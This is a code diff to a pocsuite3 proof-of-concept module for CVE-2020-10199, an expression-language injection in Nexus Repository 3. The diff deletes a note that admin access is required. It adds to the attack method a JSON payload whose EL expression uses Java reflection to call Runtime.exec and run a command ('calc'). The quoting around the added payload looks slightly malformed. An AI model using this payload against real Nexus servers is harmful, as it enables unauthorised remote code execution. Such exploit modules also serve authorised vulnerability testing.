@@ -15,7 +15,6 @@ from pocsuite3.api import POC_CATEGORY, VUL_TYPE
 
 '''
 CVE-2020-10199: Nexus 3 EL injection
-Admin access is required
 '''
 class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
     vulID = 'Nexus3-CVE-2020-10199'
@@ -138,7 +137,11 @@ class Nexus3_2020_10199_EL_INJECTION_POC(POCBase):
 
     # 攻击模块
     def _attack(self):
+        #'''
+        { "name": "internal", "online": "true", "storage": { "blobStoreName": "default", "strictContentTypeValidation": "true" }, "group": { "memberNames": [ "$\\A{''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('calc')}" ] } }
+        '''
         return self._verify()
+        
 
     # 输出报告
     def save_output(self, result):
